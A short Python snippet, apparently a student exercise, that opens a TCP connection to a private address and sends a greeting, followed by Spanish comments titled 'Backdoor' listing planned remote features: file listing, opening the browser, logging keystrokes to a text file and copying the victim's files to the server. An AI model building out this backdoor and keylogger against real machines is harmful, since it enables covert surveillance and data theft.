import socket

clientsocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
clientsocket.connect(("172.17.44.51",7777))
clientsocket.send(b'Hola!')



#Backdoor
#1. El servidor debe tener un menu para realizar las siguientes tareas en la maquina remota
# a. listar los archivos
# b. Abrir el navegador
# c. Guardar las teclas pulsadas en un .txt
# d. copiar el archivo del cliente al servidor

